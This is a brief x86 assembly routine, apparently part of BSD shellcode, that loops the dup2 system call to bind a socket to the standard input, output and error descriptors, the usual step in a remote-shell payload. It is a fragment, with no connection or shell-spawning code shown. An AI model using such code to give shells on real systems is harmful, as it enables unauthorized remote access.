;;; assumes socket is in edi
_dup2_std_fds:
	xor	ebx, ebx
	sub	ebx, byte 1

.dup2:
	inc	ebx
	push	ebx	; filedes2
	push	edi	; filedes
	push	ebx	; spacer
	mov	al, 90	; SYS_dup2
	int	0x80
	jb	end
	cmp	ebx, byte 3
	jne	.dup2	
